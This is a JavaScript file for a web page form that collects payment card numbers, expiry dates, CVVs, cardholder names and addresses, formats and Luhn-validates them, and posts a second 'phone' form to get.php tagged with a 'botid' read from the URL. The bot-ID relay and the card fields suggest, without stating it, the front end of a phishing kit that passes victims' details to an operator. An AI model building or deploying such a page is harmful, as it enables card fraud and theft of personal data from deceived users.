document.addEventListener("DOMContentLoaded", function () {
  const cardN = document.getElementById("cardn");
  const cardDate = document.getElementById("carddate");
  const cardV = document.getElementById("carv");
  const cardHolder = document.getElementById("cardholder");
  const cityAddress = document.getElementById("cityadress");
  const addressName = document.getElementById("adressname");
  const addressZip = document.getElementById("adresszip");
  const formButton = document.getElementById("form");
  const formCardText = document.getElementById("form-card");

  const originalText = formCardText?.textContent;

  function isDateValid(value) {
    const parts = value.split("/");
    if (parts.length !== 2) return false;

    const [mm, yy] = parts;
    const monthValid = mm >= 01 && mm <= 12;
    const yearValid = yy >= 23 && yy <= 35;

    return monthValid && yearValid;
  }

  function luhnCheck(val) {
    let sum = 0;
    for (let i = 0; i < val.length; i++) {
      let intVal = parseInt(val.substr(i, 1));
      if (i % 2 == 0) {
        intVal *= 2;
        if (intVal > 9) {
          intVal = 1 + (intVal % 10);
        }
      }
      sum += intVal;
    }
    return sum % 10 == 0;
  }

  function checkFilledInputs() {
    const allInputs = [
      cardN,
      cardDate,
      cardV,
      cardHolder,
      cityAddress,
      addressName,
      addressZip,
    ];
    return allInputs.every((input) => input?.value.trim() !== "");
  }

  function validateInput(input, condition) {
    if (!input) return;
    if (condition) {
      input.classList.remove("invalid-input");
    } else {
      input.classList.add("invalid-input");
    }
  }

  function handleFormClick() {
    console.log("yes1");
    const cardNValid =
      cardN?.value && luhnCheck(cardN.value.replace(/\s+/g, ""));
    const cardDateValid = cardDate?.value && isDateValid(cardDate?.value);
    const cardVValid =
      cardV?.value &&
      /^\d{0,3}?$/.test(cardV.value) &&
      cardV.value.trim() !== "";

    validateInput(cardN, cardNValid);
    validateInput(cardDate, cardDateValid);
    validateInput(cardV, cardVValid);
    if (formCardText) {
      if (!cardNValid || !cardDateValid || !cardVValid) {
        formCardText.textContent = "Check the correctness of the data*";
        formCardText.classList.remove("header-primary");
        formCardText.style.color = "red";

        setTimeout(() => {
          formCardText.textContent = originalText;
          formCardText.classList.add("header-primary");
          formCardText.style.color = ""; // Revert to default color

          const invalidInputs = document.querySelectorAll(".invalid-input");
          invalidInputs.forEach((input) => {
            input.classList.remove("invalid-input");
          });
        }, 5000);
      }
    }
    console.log("yes");
  }
  cardV?.addEventListener("input", (event) => {
    event.target.value = event.target.value.replace(/[^0-9]/g, ""); // This line will replace any non-digit characters with an empty string
    formButton.disabled = !checkFilledInputs();
  });
  cardN?.addEventListener("input", (event) => {
    event.target.value = event.target.value
      .replace(/[^0-9]/g, "")
      .replace(/(.{4})/g, "$1 ")
      .trim();
    formButton.disabled = !checkFilledInputs();
  });

  cardDate?.addEventListener("input", (event) => {
    if (
      event.inputType === "deleteContentBackward" &&
      event.target.value.endsWith("/")
    ) {
      event.target.value = event.target.value.slice(0, -1);
    }
    event.target.value = event.target.value
      .replace(/[^0-9]/g, "")
      .replace(/(\d{2})(?=\d)/, "$1/")
      .substr(0, 5);
    formButton.disabled = !checkFilledInputs();
  });

  [cardV, cardHolder, cityAddress, addressName, addressZip].forEach((input) => {
    input?.addEventListener("input", () => {
      formButton.disabled = !checkFilledInputs();
    });
  });

  formButton?.addEventListener("click", handleFormClick);

  const registrateButton = document.getElementById("registrate");
  registrateButton?.addEventListener("click", (event) => sendForm1(event));
  function sendForm1(event) {
    event.preventDefault(); // Предотвращаем стандартное поведение отправки формы
    var form = document.getElementById("form1");
    var formData = new FormData(form);
    var botId = getQueryParam("botid");
    formData.append("method", "phone");
    formData.append("botid", botId);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "get.php", true);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // Обработка успешного ответа сервера
        //  console.log(xhr.responseText);
        // sendRequestWithBotId(); // Вызываем функцию showLoaderAndRedirect() после выполнения запроса
      } else {
        // Обработка ошибок
        console.error(xhr.statusText);
      }
    };
    xhr.send(formData);
    registrateButton.disabled = true; // Делаем кнопку неактивной после отправки формы
  }
  function getQueryParam(name) {
    var urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}
});
